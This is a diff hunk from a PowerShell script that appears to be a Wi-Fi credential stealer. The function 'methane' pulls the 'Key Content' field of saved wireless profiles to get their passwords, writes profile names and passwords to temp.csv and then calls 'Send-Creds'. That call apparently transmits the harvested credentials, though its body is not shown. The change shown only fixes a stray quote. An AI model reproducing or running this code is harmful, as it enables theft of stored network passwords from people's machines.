@@ -7,7 +7,7 @@ function methane
     Select-String 'Key Content\\W+\\:(.+)$'
     %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
     %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}
-    Export-Csv temp.csv")
+    Export-Csv temp.csv
   Send-Creds
 }
 
